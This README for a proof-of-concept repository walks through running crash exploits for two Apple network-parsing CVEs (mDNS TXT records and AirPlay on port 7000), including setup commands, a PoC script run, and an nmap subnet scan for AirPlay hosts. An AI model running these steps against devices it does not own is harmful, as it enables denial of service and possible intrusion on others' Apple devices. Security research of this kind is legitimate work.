#AIRBORNE 2-PoCs-1-repository
poc for CVE-2025-24252 &amp; CVE-2025-24132

both bugs live in Apple’s parsing of network data (especially Bonjour/mDNS and AirPlay’s TCP pairing flow)

**start with CVE-2025-24252, the mDNS TXT record one**

over mDNS (Bonjour). Triggerable via malformed TXT records.

-Install scapy and avahi on Kali

sudo apt update

sudo apt install python3-scapy avahi-daemon -y

-Start avahi (mDNS responder)

sudo systemctl start avahi-daemon

git clone https://github.com/ekomsSavior/2-PoCs-1-repository.git

-Set your attacker IP and interface on crashtest_CVE-2025-24252.py

nano crashtest_CVE-2025-24252.py (edit ip & interface)

ctrl + x, then y and finally enter to exit.

-run PoC Script 

python3 crashtest_CVE-2025-24252.py

Use tcpdump to capture traffic on the Apple device’s IP

--Only test this on your own Apple devices in a safe lab setting.

**CVE-2025-24132 – AirPlay Pairing Exploit PoC**

This bug is in the AirPlayScreen component and can trigger a heap overflow by sending malformed handshake/init packets over TCP to port 7000 on the target device.**

-Scan for AirPlay Hosts

On your attacker Kali box

nmap -p 7000 --open --script=banner <your-local-subnet>/24

TCP Malformed Packet PoC CVE-2025-24132 

low-level socket-based fuzzing PoC that can be expanded into an RCE trigger with proper payload crafting






